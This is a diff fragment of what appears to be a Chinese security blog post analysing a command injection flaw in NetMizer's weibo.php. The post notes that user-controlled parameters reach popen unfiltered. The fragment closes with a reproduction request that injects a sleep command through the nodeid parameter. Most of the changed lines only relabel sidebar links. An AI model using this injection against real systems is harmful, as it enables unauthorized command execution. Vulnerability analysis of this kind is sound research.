@@ -22,11 +22,11 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
 
 深入探索
 
-计算机安全课程
+安全研究资源
 
-漏洞修复方案
+Windows安全工具
 
-安全工具订阅
+SQL注入检测
 
 看下 `weibo.php` 业务实现关键逻辑部分
 
@@ -79,21 +79,13 @@ NetMizer日志管理系统是一款专为网络流量管理和优化设计的日
        $fp = @popen($cmd,"r");
 ```
 
-深入探索
-
-Web安全咨询
-
-SQL数据库优化
-
-原创内容授权
-
 当 `$action == 'file'` 时，多个参数如 nodeid、username、qq 这些由用户可控并直接拼接到cmd命令中且无任何过滤和校验，然后使用popen执行，造成[命令注入](https://mrxn.net/tag/rce)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例
 
-漏洞扫描服务
+漏洞分析报告
 
 ```
 GET /data/search/weibo.php?action=file&nodeid=;sleep+3+%23+ HTTP/1.1
